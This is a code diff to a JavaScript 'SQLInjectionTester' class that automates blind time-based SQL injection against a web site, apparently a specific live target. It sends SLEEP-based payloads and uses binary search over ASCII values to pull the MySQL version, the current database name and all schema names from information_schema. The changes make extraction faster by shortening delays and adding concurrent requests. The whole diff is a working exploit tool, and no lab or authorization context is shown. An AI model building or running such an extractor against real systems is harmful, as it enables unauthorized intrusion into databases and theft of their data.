@@ -693,7 +693,7 @@ export class SQLInjectionTester {
         this.logger?.info(`Starting blind extraction for ${param}`, { vulnType, originalValue });
         
         // Helper function to create conditional payloads
-        const createPayload = (condition, delayTime = 1.5) => {
+        const createPayload = (condition, delayTime = 1) => {
             // Always use time-based for this site since boolean gives 500 errors
             return `' AND IF(${condition},SLEEP(${delayTime}),0)-- -`;
         };
@@ -713,7 +713,7 @@ export class SQLInjectionTester {
                 const duration = Date.now() - start;
                 
                 // Always check for time delay since we're using time-based payloads
-                const delayed = duration > 1200; // 1.2 seconds threshold for 1.5 second delay
+                const delayed = duration > 800; // 0.8 seconds threshold for 1 second delay
                 
                 this.logger?.debug(`Condition check result: ${delayed} (duration: ${duration}ms)`);
                 
@@ -728,73 +728,131 @@ export class SQLInjectionTester {
             }
         };
         
+        // Helper to extract a single character at a position
+        const extractSingleChar = async (query, position, totalLength) => {
+            let low = 32, high = 126; // Printable ASCII range
+            let foundChar = null;
+            
+            // Binary search for the character
+            while (low <= high) {
+                const mid = Math.floor((low + high) / 2);
+                const condition = `ASCII(SUBSTRING(${query},${position},1))>${mid}`;
+                
+                if (await checkCondition(condition)) {
+                    low = mid + 1;
+                } else {
+                    // Check if it equals mid
+                    const eqCondition = `ASCII(SUBSTRING(${query},${position},1))=${mid}`;
+                    if (await checkCondition(eqCondition)) {
+                        foundChar = String.fromCharCode(mid);
+                        break;
+                    }
+                    high = mid - 1;
+                }
+            }
+            
+            // Update progress display
+            process.stdout.write(`\r🔍 Extracting ${query.substring(0, 20)}... [${position}/${totalLength}] ${foundChar ? '✓' : '✗'}${' '.repeat(20)}`);
+            
+            return foundChar;
+        };
+        
         // Extract using binary search for efficiency
         const extractString = async (query, maxLength = 50) => {
             let result = '';
             
-            // First, find the actual length
+            // First, find the actual length using binary search for faster results
             let stringLength = 0;
-            for (let len = 1; len <= maxLength; len++) {
-                const condition = `LENGTH(${query})=${len}`;
+            let low = 1, high = maxLength;
+            
+            // Show progress for length finding
+            process.stdout.write(`\r📏 Finding length of ${query.substring(0, 20)}...`);
+            
+            while (low <= high) {
+                const mid = Math.floor((low + high) / 2);
+                const condition = `LENGTH(${query})>=${mid}`;
+                
                 if (await checkCondition(condition)) {
-                    stringLength = len;
-                    this.logger?.info(`Found length for ${query}: ${len}`);
-                    break;
+                    stringLength = mid;
+                    low = mid + 1;
+                    
+                    // Check exact length
+                    const exactCondition = `LENGTH(${query})=${mid}`;
+                    if (await checkCondition(exactCondition)) {
+                        stringLength = mid;
+                        break;
+                    }
+                } else {
+                    high = mid - 1;
                 }
             }
             
             if (stringLength === 0) {
-                this.logger?.warn(`Could not determine length for ${query}`);
+                process.stdout.write(`\r❌ Could not determine length for ${query.substring(0, 20)}${' '.repeat(30)}\n`);
                 return null;
             }
             
-            // Extract each character
-            for (let pos = 1; pos <= stringLength; pos++) {
-                let low = 32, high = 126; // Printable ASCII range
-                let foundChar = null;
-                
-                // Binary search for the character
-                while (low <= high) {
-                    const mid = Math.floor((low + high) / 2);
-                    const condition = `ASCII(SUBSTRING(${query},${pos},1))>${mid}`;
+            process.stdout.write(`\r✅ Found length: ${stringLength}${' '.repeat(50)}\n`);
+            
+            // Extract characters with multithreading
+            const CONCURRENT_CHARS = 3; // Extract 3 characters at a time
+            const charPromises = [];
+            let extractedSoFar = '';
+            
+            // Process characters in batches
+            for (let batchStart = 1; batchStart <= stringLength; batchStart += CONCURRENT_CHARS) {
+                const batchEnd = Math.min(batchStart + CONCURRENT_CHARS - 1, stringLength);
+                const batchPromise = (async () => {
+                    // Extract characters in this batch concurrently
+                    const promises = [];
+                    for (let pos = batchStart; pos <= batchEnd; pos++) {
+                        promises.push(extractSingleChar(query, pos, stringLength));
+                    }
                     
-                    if (await checkCondition(condition)) {
-                        low = mid + 1;
-                    } else {
-                        // Check if it equals mid
-                        const eqCondition = `ASCII(SUBSTRING(${query},${pos},1))=${mid}`;
-                        if (await checkCondition(eqCondition)) {
-                            foundChar = String.fromCharCode(mid);
-                            break;
-                        }
-                        high = mid - 1;
+                    const chars = await Promise.all(promises);
+                    return { start: batchStart, chars };
+                })();
+                
+                charPromises.push(batchPromise);
+                
+                // Limit concurrent batches to avoid overwhelming the server
+                if (charPromises.length >= 2) {
+                    const batch = await charPromises.shift();
+                    for (let i = 0; i < batch.chars.length; i++) {
+                        result += batch.chars[i] || '?';
+                        extractedSoFar = result;
+                        // Show partial results as we extract
+                        process.stdout.write(`\r💾 Extracted so far: ${extractedSoFar}${'*'.repeat(stringLength - extractedSoFar.length)}${' '.repeat(20)}`);
                     }
                 }
-                
-                if (foundChar) {
-                    result += foundChar;
-                    this.logger?.info(`Extracted character ${pos}/${stringLength}: ${foundChar}`);
-                } else {
-                    this.logger?.warn(`Failed to extract character at position ${pos}`);
-                    break;
-                }
-                
-                // Add small delay to avoid overwhelming the server
-                await new Promise(r => setTimeout(r, 50));
             }
             
+            // Wait for remaining batches
+            const remainingBatches = await Promise.all(charPromises);
+            for (const batch of remainingBatches) {
+                for (const char of batch.chars) {
+                    result += char || '?';
+                    extractedSoFar = result;
+                    // Show partial results as we extract
+                    process.stdout.write(`\r💾 Extracted so far: ${extractedSoFar}${'*'.repeat(Math.max(0, stringLength - extractedSoFar.length))}${' '.repeat(20)}`);
+                }
+            }
+            
+            process.stdout.write(`\r✅ Extracted: ${result}${' '.repeat(30)}\n`);
             return result || null;
         };
         
         try {
             // Step 1: Detect database type by checking VERSION() pattern
-            this.logger?.info(`Detecting database type...`);
+            process.stdout.write(`\r🔎 Detecting database type...${' '.repeat(50)}`);
             
             // Check if it's MySQL/MariaDB by checking if VERSION() starts with a number
             if (await checkCondition(`SUBSTRING(VERSION(),1,1)>='0' AND SUBSTRING(VERSION(),1,1)<='9'`)) {
+                process.stdout.write(`\r✅ Detected MySQL/MariaDB${' '.repeat(50)}\n`);
                 dbInfo.type = 'MySQL';
                 
                 // Extract version - first 10 chars should be enough (e.g., "5.7.32-log")
+                process.stdout.write(`📊 Extracting database version...\n`);
                 const version = await extractString(`SUBSTRING(VERSION(),1,10)`);
                 if (version) {
                     dbInfo.version = version;
@@ -805,12 +863,14 @@ export class SQLInjectionTester {
                 }
                 
                 // Extract database name
+                process.stdout.write(`📊 Extracting database name...\n`);
                 const dbName = await extractString(`DATABASE()`);
                 if (dbName) {
                     dbInfo.name = dbName;
                 }
                 
                 // Try to get all database names (limit to first 100 chars)
+                process.stdout.write(`📊 Extracting all database names...\n`);
                 const allDbs = await extractString(
                     `(SELECT SUBSTRING(GROUP_CONCAT(schema_name),1,100) FROM information_schema.schemata WHERE schema_name NOT IN ('information_schema','performance_schema','mysql','sys'))`
                 );
